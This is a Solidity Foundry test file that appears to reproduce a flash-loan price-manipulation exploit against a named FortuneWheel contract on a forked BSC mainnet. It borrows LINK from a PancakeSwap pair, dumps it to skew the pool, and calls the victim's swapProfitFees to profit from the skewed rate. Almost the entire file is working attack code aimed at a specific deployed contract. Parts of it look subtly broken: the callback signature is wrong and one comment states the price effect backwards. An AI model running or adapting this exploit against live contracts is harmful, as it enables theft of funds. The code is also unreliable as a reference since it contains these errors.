// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/interfaces/IPancakePair.sol";
import "../src/interfaces/IPancakeRouter02.sol";

interface IFortuneWheel {
    function swapProfitFees() external;
}

contract Exploit is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;

    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

 // FortuneWheel contract
    address constant VICTIM = 0x384b9fb6E42dab87F3023D87ea1575499A69998E;

    // Pancake pair for LINK-WBNB
    address constant LINK_WBNB_PAIR =0x824eb9faDFb377394430d2744fa7C42916DE3eCe; // LINK-WBNB Pancake pair

    IPancakePair pair = IPancakePair(LINK_WBNB_PAIR);
    IERC20 link = IERC20(LINK);
    IERC20 wbnb = IERC20(WBNB);
    IFortuneWheel victim = IFortuneWheel(VICTIM);

    function setUp() public {
        // Forking BSC mainnet at block before exploit
        string memory rpcUrl = "https://bsc-dataseed.binance.org/";
        vm.createSelectFork(rpcUrl, 45640245);
    }

    function testExploit() public {
        // Logging initial balances (simulating attacker)
        uint initialBalance = address(this).balance;
        console.log("Initial attacker ETH balance:", initialBalance);

        //Initiated flash loan from Pancake pair (borrow LINK, assuming WBNB is token0, LINK token1)
        (,uint reserve1,) = pair.getReserves();
        uint borrowAmount = reserve1 / 2; // Borrow half the LINK reserve for manipulation.

        // Called swap for flash loan 
        pair.swap(0, borrowAmount, address(this), abi.encode("flashloan"));

    
        uint profit = address(this).balance - initialBalance;
        console.log("Profit in ETH:", profit);
        assertGt(profit, 0, "No profit made");
    }

    // Callback from Pancake pair
    function pancakeCall(uint amount1) external {
        require(msg.sender == address(pair), "Not pair");

        // Used borrowed LINK to manipulate pool, dumps LINK to WBNB to increase LINK price
        link.approve(PANCAKE_ROUTER, amount1);
        address[] memory path = new address[](2);
        path[0] = LINK;
        path[1] = WBNB;
        IPancakeRouter02(PANCAKE_ROUTER).swapExactTokensForETH(amount1, 0, path, address(this), block.timestamp);

        // Called vulnerable swapProfitFees to force victim contract to swap at manipulated rate
        victim.swapProfitFees();

        // Swapping back WBNB to LINK to repay flash loan
        path[0] = WBNB;
        path[1] = LINK;
        uint repayAmount = (amount1 * 1003) / 1000; 
        IPancakeRouter02(PANCAKE_ROUTER).swapExactETHForTokens{value: address(this).balance}(0, path, address(this), block.timestamp);

        
        link.transfer(address(pair), repayAmount);
    }

    
    receive() external payable {}
}